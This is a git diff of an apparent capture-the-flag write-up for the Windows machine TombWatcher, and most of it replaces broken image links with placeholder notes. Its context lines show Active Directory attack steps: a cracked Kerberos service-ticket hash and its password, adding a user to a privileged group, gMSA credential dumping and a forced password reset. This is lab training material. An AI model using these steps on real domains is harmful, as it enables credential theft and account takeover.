@@ -1,4 +1,7 @@
-![Alt TombWatcher](/Images//TombWatcher.png)
+
+
+> **Missing screenshot:** Alt TombWatcher. Original: `/Images//TombWatcher.png`. Restore to `images/TombWatcher.png`.
+
 
 # Windows Medium 
 
@@ -178,7 +181,9 @@ Nmap done: 1 IP address (1 host up) scanned in 110.85 seconds
 ## Bloodhound-Python
 Lets run some bloodhound!
 
-![Alt Henry to Alfred](/Images/alfred-tombwatcher.png)
+
+> **Missing screenshot:** Alt Henry to Alfred. Original: `/Images/alfred-tombwatcher.png`. Restore to `images/alfred-tombwatcher.png`.
+
 
 ### Command Used
 
@@ -256,7 +261,9 @@ The BloodHound graph reveals the following key relationship:
 
 This means the `henry` user has **WriteServicePrincipalName** rights over the `alfred` user object in Active Directory.
 
-![Alt BloodHound File Ingestion](/Images/WriteSPN.png)
+
+> **Missing screenshot:** Alt BloodHound File Ingestion. Original: `/Images/WriteSPN.png`. Restore to `images/WriteSPN.png`.
+
 
 ---
 
@@ -338,7 +345,6 @@ ServicePrincipalName  Name    MemberOf  PasswordLastSet             LastLogon  D
 fake/httpservice      Alfred            2025-05-12 08:17:03.526670  <never>               
 
 
-
 [-] CCache file is not found. Skipping...
 $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$3e68f31da55a6e0bd7cddba2da11a749$2d543aa4635c8fdffef28cac887dae5958606b76cae2ce12c899968ac11fdda9a6a5e2a392534b16fe99ec7ca582fb1f22a99b712b7b4967f268eddc85aaf219a0f9111759c3a3c4c9247c86f33034f08c4b1c501f5ad4a6027fa7ec351e538ce594f3d0ef9c6b13d3547c8378b5ad7cc23eb1c47e07b9041f3169971b521f05c90729786648a60e40e14a29f2c9fc8a1ca7909f59e28ad8aceac007b92a746fbcd7e68de1afa1f63001387119a479ab4a194854102d20524ac38e3406d65c1bfdea389baf9d7a0521261290a2060aa8a2e5b17d5f6514b2f2a79a79a018a988361672ddfed9b1e64285a89bf630f94dac2a2a664fd957d08f1b4e67ec0e8b02daf26dd8fb454b8943d480aafd86d4db6e93aa9bd0ec6b2a644e7104836758367f846d42a30f1e918ee50b499764d2f62f220bf86d591df8d3da447eeaeac6df63d610a87819042b8baa6c120eae03a56f538cadfb8df0aa92383a196b5bee4e45abd30997b25a0737b4ce9e0e8db74c9cb8c8b461655ddbf237816549b5ca26dad9b1ddfaca246044a667b26fa5d44461a6f547bd437ca3659d143c8b7196d4880d58676ccdc31e4457a2d88cacfde12997f3cd740ad4432c8eee2c9b2a9eb7e543c57f25fc66483265f6d3e0ce9e0e071619daea270065f403431046a553396c66db951741d60ba1a1441e43daa1e7b0e4a4cd2ab1ce3c6fa138394f814071eb4850589c819b9922af7b02bb0952fbe62817030f57481f5090767574cf582879ee41f60cf9f92d522718e4541de4573e89844c3914cb99a2746480fc84e63505aa771285a5beacc277870a6a177c5e679cb829e88de7fe867f71828515d1800f2328d2a03a26cf431a5168184494edd7a3471f51062b2577118a5f2e46174cccde7e31f0e2cfad3698740f59e1b104580206a26b8f1a6c406ff4b60aaedc21f23f9ac49d0f07c39716c7162a27d19087af8f22a2c213acaa1ee95f9aec65680ac6abd506026910e5649ca8fe15355fa7e0b80734cc0391cefce8755e08c075b1babaf0574a9ffa2c332a78a8817772bed89f6de5f669ac85de75f21a07f1c7ff5032088f977ac70551151f1976a0cfaf3f7932ca4ae5075c335b3b92a5dfb30e156c50826215b08bd3a835e6059ce46d554e4162ff44c1a769f9cdd519dfac5cb1c515eafe0d4582e91727207a04b8753df1a398e5de1c49dc31644d6b0594ea059a225bff60d7a1c6662af2b82b7a04c276dc33f2d3267293b2657e9dddd8c37c6b35b73a688999bfbe40630648ccefbd5840ee8f22d3af5b4d7e02ec00c3b46ffd062c72e6f83d234aea8c7cf8130f5d4693d1f156a5c3f212eb87a26f4fccb7c5580bd7726eb62d85def3ecfc2febe032a5644a723345077221e94e47fa0f27fcf9d22b229d01d4f58c53e217c94c4c05967268a48848783a7b6590d58176a6d716745d08bdbd5a0f0c14b7237a45e53d3a81:basketball
                                                           
@@ -383,11 +389,12 @@ Successfully cracking this hash reveals the plaintext password for the `alfred` 
 2. Security group delegation means every member inherits the group’s privileges.  
 3. After joining, `ALFRED` will hold all permissions already assigned to `INFRASTRUCTURE@TOMBWATCHER.HTB`.
 
-![Alt TombWatcher](/Images/alfred-tombwatcher.png
 
 ## 1. Add **ALFRED** to the **INFRASTRUCTURE** Group
 
-![Adding ALFRED](/Images/alfred-tombwatcher.png)
+
+> **Missing screenshot:** Adding ALFRED. Original: `/Images/alfred-tombwatcher.png`. Restore to `images/alfred-tombwatcher.png`.
+
 
 ### Command
 ```bash
@@ -414,7 +421,9 @@ add groupMember 'infrastructure' 'alfred'
 
 ## 2. Dump gMSA Credentials with NetExec
 
-![gMSA Enumeration](Images/infra-to-ansible.png)
+
+> **Missing screenshot:** gMSA Enumeration. Original: `Images/infra-to-ansible.png`. Restore to `images/infra-to-ansible.png`.
+
 
 ### Command
 ```bash
@@ -496,7 +505,9 @@ set password 'sam' 'DeadSecOps'
 
 # Escalation via WriteOwner then GenericAll
 
-![Sam to JOhn](/Images/sam-to-john.png)
+
+> **Missing screenshot:** Sam to JOhn. Original: `/Images/sam-to-john.png`. Restore to `images/sam-to-john.png`.
+
 
 ## Scenario
 
